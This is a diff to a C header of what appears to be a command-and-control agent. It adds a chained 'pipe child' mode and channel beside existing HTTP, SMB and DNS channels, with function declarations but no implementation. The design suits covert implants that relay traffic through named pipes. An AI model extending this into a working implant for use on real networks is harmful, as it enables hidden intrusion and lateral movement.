@@ -338,12 +338,17 @@ BOOL rsa_encrypt(const unsigned char *modulus, DWORD mod_len,
                  const unsigned char *plaintext, DWORD pt_len,
                  unsigned char **out, DWORD *out_len);
 
+/* ─── Pipe child mode (set from command line PIPE:<name>) ─── */
+extern BOOL g_pipe_child_mode;        /* TRUE = chained agent via parent pipe */
+extern char g_pipe_child_name[256];   /* pipe name from command line */
+
 /* ─── Channel abstraction ─── */
 
 #define CHANNEL_HTTP  0
 #define CHANNEL_SMB   1
 #define CHANNEL_DNS   2
-#define CHANNEL_MAX   3
+#define CHANNEL_PIPE_CHILD 3
+#define CHANNEL_MAX   4
 
 typedef BOOL (*ChannelInitFn)(void);
 typedef void (*ChannelCleanupFn)(void);
@@ -393,6 +398,12 @@ BOOL smb_send_recv(const unsigned char *packet, DWORD packet_len,
 BOOL smb_start_pipe_server(void);
 void smb_stop_pipe_server(void);
 BOOL smb_relay_pending(void);
+
+/* Pipe child channel (chained agent — creates pipe server, parent connects) */
+BOOL pipe_child_init(void);
+void pipe_child_cleanup(void);
+BOOL pipe_child_send_recv(const unsigned char *packet, DWORD packet_len,
+                          unsigned char **response, DWORD *response_len);
 
 /* ─── channel_dns.c — DNS ─── */
 BOOL dns_init(void);
